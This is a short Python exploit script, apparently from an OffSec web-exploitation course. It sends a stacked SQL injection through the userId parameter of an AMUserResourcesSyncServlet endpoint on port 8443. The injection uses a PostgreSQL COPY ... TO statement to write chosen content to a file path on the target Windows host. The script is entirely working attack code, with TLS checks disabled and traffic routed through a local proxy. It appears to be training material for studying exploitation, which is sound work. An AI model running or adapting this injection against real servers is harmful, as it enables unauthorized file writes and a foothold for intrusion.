import sys, re, os
import requests
from bs4 import BeautifulSoup

def write_to_file(ip, content, filePath):
	s = requests.Session()

	headers = {
		'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0',
		'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8'
	}
	s.headers.update(headers)

	proxies = {
		'http': 'http://127.0.0.1:8080'
	}
	s.proxies.update(proxies)

	userId = f"1;COPY+(SELECT+$${content}$$)+TO+$${filePath}$$;--+"
	target = f"https://{ip}:8443/servlet/AMUserResourcesSyncServlet?" + \
		f"ForMasRange=1&userId={userId}"
	print(target)

	r = s.get(target, verify = False)


def main():
	if len(sys.argv) != 2:
		print ("(+) usage: %s <target>" % sys.argv[0])
		print ('(+) eg: %s 192.168.121.103'  % sys.argv[0])
		sys.exit(-1)

	ip = sys.argv[1]

	write_to_file(ip, "awae", "C:\\Users\\Public\\offsec.txt")

if __name__ == '__main__':
	main()